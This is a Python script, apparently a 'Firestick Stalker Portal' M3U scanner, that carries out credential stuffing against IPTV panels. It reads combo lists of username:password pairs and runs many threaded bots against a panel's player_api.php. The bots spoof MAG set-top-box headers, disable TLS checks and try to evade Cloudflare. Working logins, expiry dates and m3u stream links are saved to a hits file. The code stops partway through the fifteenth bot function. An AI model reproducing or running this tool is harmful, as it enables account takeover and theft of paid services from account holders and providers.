import os
import pip
import random
import subprocess
import json
import sys
import re
import pathlib
import threading
import time
import datetime

import logging
try:
    import requests
except:
    print("requests module not installed \n installing requests module\n")
    pip.main(['install', 'requests'])
    import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)


try:
    import cfscrape

    sesq = requests.Session()
    ses = cfscrape.create_scraper(sess=sesq)
except:
    ses = requests.Session()

try:
    import androidhelper as sl4a
    ad = sl4a.Android()
except:
    pass
my_os = os.name
if my_os == "DARWIN":
    rootDir = "/Users/owner/Downloads"
else:
    rootDir = "/Users/owner/Downloads"
dir = rootDir + '/hits/'
if not os.path.exists(dir):
    os.makedirs(dir)
proxy = rootDir + '/Proxy'
if not os.path.exists(proxy):
    os.makedirs(proxy)
combo = rootDir + '/combo'
if not os.path.exists(combo):
    os.makedirs(combo)
dir = rootDir + '/panel_list'
if not os.path.exists(dir):
    os.makedirs(dir)


def clean():
    os.system('cls' if os.name == "Darwin" else 'clear')


clean()
pattern = r"(^\S{2,}:\S{2,}$)|(^.*?(\n|$))"
clean()
hit = 0
bul = 0
cpm = 1
mac = ""  #str(get_mac())
nick = "🚀Bart💫𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒🇵🇭"
if my_os == "Darwin":
    def barts(z):
        for e in z + '\n':
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.001)


    barts("""
    \33[44m\33[38;5;027m   ╔═╗╦╦═╗╔═╗╔═╗╔╦╗╦╔═╗╦╔═    \33[0m
    \33[44m\33[38;5;062m   ╠╣ ║╠╦╝║╣ ╚═╗ ║ ║║  ╠╩╗    \33[0m
    \33[44m\33[38;5;097m   ╚  ╩╩╚═╚═╝╚═╝ ╩ ╩╚═╝╩ ╩    \33[0m
    \33[1;40m    ╔═╗╔╦╗╔═╗╦  ╦╔═╔═╗╦═╗     \33[0m
    \33[1;40m    ╚═╗ ║ ╠═╣║  ╠╩╗║╣ ╠╦╝     \33[0m
    \33[1;40m    ╚═╝ ╩ ╩ ╩╩═╝╩ ╩╚═╝╩╚═     \33[0m
    \33[46m\33[38;5;027m      ╔═╗╔═╗╦═╗╔╦╗╔═╗╦        \33[0m
    \33[46m\33[38;5;062m      ╠═╝║ ║╠╦╝ ║ ╠═╣║        \33[0m
    \33[46m\33[38;5;097m      ╩  ╚═╝╩╚═ ╩ ╩ ╩╩═╝      \33[0m
    \33[38;5;027m  ╔════════════════════════╗
    \33[38;5;132m     ((( BART ATTACK )))      \33[0m
    \33[38;5;062m   FIRESTICK STALKER PORTAL    \33[0m
    \33[38;5;027m      100 Bot M3U Scanner     \33[0m
    \33[38;5;062m  ╚════════════════════════╝
    \33[95m ▄ ▄ █ ▄ █ Trinity █ ▄ █ ▄ ▄  \33[0m
    """)
    time.sleep(2)
else:
    def print_with_delay(text, delay=0.001):
        for char in text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(delay)


    fsp = ("""\33[6m
    \33[1;32m🅵🅸🆁🅴🆂🆃🅸🅲🅺 🆂🆃🅰🅻🅺🅴🆁 🅿🅾🆁🆃🅰🅻   \33[0m
    \33[1;95m🅵🅸🆁🅴🆂🆃🅸🅲🅺 🆂🆃🅰🅻🅺🅴🆁 🅿🅾🆁🆃🅰🅻   \33[0m
    \33[1;91m🅵🅸🆁🅴🆂🆃🅸🅲🅺 🆂🆃🅰🅻🅺🅴🆁 🅿🅾🆁🆃🅰🅻   \33[0m
    \33[1;36mᴘʏᴛʜᴏɴ Mᴬᶜ                          \33[0m
    🌟🌟🌟 𝔅𝔲𝔦𝔩𝔱 𝔟𝔶 𝔅𝔞𝔯𝔱  🌟🌟🌟                                                        
    \33[0m           
    \33[0;1m""")
    print_with_delay(fsp)
time.sleep(2)

say = 0
dsy = ""
dir = rootDir + '/combo/'
for files in os.listdir(dir):
    #if files.endswith(".txt"):
    say = say + 1
    dsy = dsy + "    " + str(say) + "-) " + files + '\n'
print("""PICK YOUR COMBO!!!
    
""" + dsy + """
  \33[33mCOMBOS IN YOUR FOLDER """ + str(say) + """ FOUND!
""")
dsyno = str(input(" \33[31mCOMBO NUMBER?=\33[0m"))
say = 0
for files in os.listdir(dir):
    #if files.endswith(".txt"):
    say = say + 1
    if dsyno == str(say):
        filea = (dir + files)
        break
say = 0

clean()
print(files)
botsay = input("""
\33[1;96m 
CHOOSE HOW MANY BOTS...!\33[0m

    \33[1;33m1 to 100
   NUMBER OF BOTS...!!\33[0m
      
BOTS=""")
botsay = int(botsay)

HEADERd = {
    "Cookie": "stb_lang=en; timezone=Europe%2FIstanbul;",
    "X-User-Agent": "Model: MAG254; Link: Ethernet",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip, deflate",
    "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
}

dsy = filea  #rootDir + '/'+combo+'.txt'
combo = dsy
file = ""
file = pathlib.Path(dsy)
if file.exists():
    print("FILE FOUND ")
else:
    print("\33[31mFile not found..! \33[0m")
    file = "None"
if file == "None":
    exit()

c = open(dsy, 'r', encoding='utf-8')
totLen = c.readlines()
uz = (len(totLen))

clean()

print("Bot:" + str(botsay))

#################
panel = input("""
     \33[1mINPUT YOUR PANEL \n
DNS:PORT = \33[31m\33[1m""")
#=======+++=++++++====++=======
panel = panel.replace("http://", "")
panel = panel.replace("/c", "")
panel = panel.replace("/", "")
portal = panel
fx = portal.replace(':', '_')
channel = input("""
DO YOU WANT TO ADD CHANNELS CATEGORIES?
1 = YES
2 = NO
ANSWER TYPE ➤ 1 FOR YES ➤ 2 FOR NO \n
ENTER ➤ """)
if not channel == "1":
    channel = 2
clean()


def category(categlink):
    try:
        res = ses.get(categlink, headers=HEADERd, timeout=15, verify=False)
        data = ""
        kate = ""
        data = str(res.text)
        for i in data.split('category_name":"'):
            kate = kate + " «❖» " + str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace(r'\/', '/')
    except:
        pass
    return kate


def onay(data, user, pas):
    status = data.split('status":')[1]
    status = status.split(',')[0]
    status = status.replace('"', "")
    categlink = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_categories"

    sound = rootDir + "/sound/kemik_sesi.mp3"
    file = pathlib.Path(sound)
    try:
        if file.exists():
            ad.mediaPlay(sound)
    except:
        pass

    acon = ""
    acon = data.split('active_cons":')[1]
    acon = acon.split(',')[0]
    acon = acon.replace('"', "")
    mcon = data.split('max_connections":')[1]
    mcon = mcon.split(',')[0]
    mcon = mcon.replace('"', "")
    timezone = data.split('timezone":"')[1]
    timezone = timezone.split('",')[0]
    timezone = timezone.replace(r"\/", "/")

    realm = data.split('url":')[1]
    realm = realm.split(',')[0]
    realm = realm.replace('"', "")
    port = data.split('port":')[1]
    port = port.split(',')[0]
    port = port.replace('"', "")
    user = data.split('username":')[1]
    user = user.split(',')[0]
    user = user.replace('"', "")
    passw = data.split('password":')[1]
    passw = passw.split(',')[0]
    passw = passw.replace('"', "")
    expiry = data.split('exp_date":')[1]
    expiry = expiry.split(',')[0]
    expiry = expiry.replace('"', "")
    if expiry == "null":
        expiry = "Unlimited"
    else:
        expiry = (datetime.datetime.fromtimestamp(int(expiry)).strftime('%Y-%m-%d %H:%M:%S'))
    expiry = expiry

    if channel == "1":
        try:
            category = ""
            res = ses.get(categlink, headers=HEADERd, timeout=15, verify=False)
            data = ""
            kate = ""
            data = str(res.text)
            for i in data.split('category_name":"'):
                kate = kate + " 🌟 " + str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace(r'\/', '/')
            category = kate
        except:
            pass

    url5 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_streams"
    try:
        res = ses.get(url5, timeout=15, verify=False)
        data = str(res.text)
        numberofchannels = str(data.count("stream_id"))

        url5 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_vod_streams"
        res = ses.get(url5, timeout=15, verify=False)
        data = str(res.text)
        numberoffilms = str(data.count("stream_id"))

        url5 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_series"
        res = ses.get(url5, timeout=15, verify=False)
        data = str(res.text)
        numberofseries = str(data.count("series_id"))

    except:
        pass

    m3ulink = "http://" + panel + "/get.php?username=" + user + "&password=" + pas + "&type=m3u_plus"
    sayi = ""
    mt = ("""
╭─➤  HITS BY""" + str(nick) + """
├🔸🌐 HOST ➤ http://""" + portal + """
├♦️🌍 REAL ➤ http://""" + realm + """
├🔸📡 PORT ➤ """ + port + """
├♦️👩‍ USER ➤ """ + user + """
├🔸🔑 PASSWORD ➤ """ + pas + """
├♦️📆 EXPIRY ➤ """ + expiry + """
├🔸👩 ACTIVE CONNECTIONS ➤ """ + acon + """
├♦️👪 MAX CONNECTIONS ➤ """ + mcon + """ 
├🔸🌐 STATUS ➤ """ + status + """
├♦️⏰ LOCAL TIME ➤ """ + timezone + """
╰─➤  𝗛𝗶𝘁𝘀 ʙʏ """ + str(nick) + """   """)

    if not numberofchannels == "":
        sayi = ("""
╭➤🎬 NUMBER OF CHANNELS➤""" + numberofchannels + """
├●🎬 NUMBER OF FILMS➤""" + numberoffilms + """
├●🎬 NUMBER OF SERIES➤""" + numberofseries + """
╰─➤BY """ + str(nick) + """ ➤ m3u➤ """)

    if channel == "1":
        imzak = """
├«❖» «❖» CATEGORIES➤\n
""" + str(category) + """ """
    mtl = ("""
├●🔗 ➤ m3u_URL➤""" + m3ulink + """
""")

    yaz(mt + sayi + mtl + imzak + '\n')
    print(mt + sayi + mtl + imzak)


hits = rootDir + "/hits/"
Dosyab = hits + panel.replace(":", "_").replace('/', '') + "@🚀FSP💫𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒🇵🇭.txt"


def yaz(user):
    file = open(Dosyab, 'a', encoding='utf-8')
    file.write(user)
    file.close()


cpm = 0


def echox(user, pas, bot, fyz, oran, hit):
    global cpm

    cpmx = (time.time() - cpm)
    cpmx = (round(60 / cpmx))
    #cpm=cpmx
    if str(cpmx) == "0":
        cpm = cpm
    else:
        cpm = cpmx

    echo = ("""\33[0m
╭───➤\33[0m @ 𝔽𝕀ℝ𝔼𝕊𝕋𝕀ℂ𝕂 𝕊𝕋𝔸𝕃𝕂𝔼ℝ ℙ𝕆ℝ𝕋𝔸𝕃    
├●  \33[1;32m\33[32mM3U PORTAL➤ \33[1;107;31m """ + portal + """ \33[0m     
├─●   \33[0m\033[1m""" + user + """:""" + pas + """
├──●   \33[33mHIT➤""" + str(hit) + """ \33[32m \033[0m \33[1;31m%""" + str(oran) + """  \33[1;94mCPM➤""" + str(cpm) + """  \33[0m
╰───●   \33[97m""" + str(bot) + """  \33[1;36m  TOTAL➤""" + str(fyz) + """   \33[0m""")
    print("\033[H\033[J", end="")
    print(echo)


hit = 0


def d1():
    global hit
    say = 0
    for fyz in range(1, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '@'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '@'
            say = int(say) + 1
            bot = 'BOTS_01'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1=bag1+1
                    time.sleep(1)
                if bag1==100:
                    quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d2():
    global hit
    say = 0
    for fyz in range(2, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOT_02'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(1)
                if bag1 == 100:
                    quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d3():
    global hit
    say = 0
    for fyz in range(3, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_03'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(1)
                if bag1 == 100:
                    quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d4():
    global hit
    say = 0
    for fyz in range(4, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_04'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(1)
                if bag1 == 100:
                    quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d5():
    global hit
    say = 0
    for fyz in range(5, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_05'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(1)
                if bag1 == 100:
                    quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d6():
    global hit
    say = 0
    for fyz in range(6, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_06'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(1)
                if bag1 == 100:
                    quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d7():
    global hit
    say = 0
    for fyz in range(7, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_07'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(1)
                if bag1 == 100:
                    quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d8():
    global hit
    say = 0
    for fyz in range(8, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_08'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(1)
                if bag1 == 100:
                    quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d9():
    global hit
    say = 0
    for fyz in range(9, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_09'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d10():
    global hit
    say = 0
    for fyz in range(10, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_10'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d11():
    global hit
    say = 0
    for fyz in range(11, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_11'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d12():
    global hit
    say = 0
    for fyz in range(12, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_12'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d13():
    global hit
    say = 0
    for fyz in range(13, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_13'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d14():
    global hit
    say = 0
    for fyz in range(14, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_14'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d15():
    global hit
    say = 0
    for fyz in range(15, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_15'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
